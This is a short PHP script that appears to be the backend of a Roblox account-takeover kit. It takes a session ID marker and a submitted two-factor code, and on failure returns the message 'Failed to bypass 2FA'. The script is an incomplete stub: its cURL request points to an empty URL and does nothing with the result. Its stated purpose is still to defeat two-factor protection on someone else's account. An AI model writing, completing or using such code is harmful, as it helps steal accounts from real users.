<?php
session_start();
header("content-type: application/json");
$post = json_decode(file_get_contents("php://input"), true);
if(isset($_SESSION[".RBXIDCHECK"]) && !empty($_SESSION[".RBXIDCHECK"]) && isset($post[".2FACODE"]) && !empty($post[".2FACODE"])) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $data = json_decode(curl_exec($ch), true);
    curl_close($ch);
} else {
    die(json_encode(["error" => ["message" => "Failed to bypass 2FA"]]));
};
?>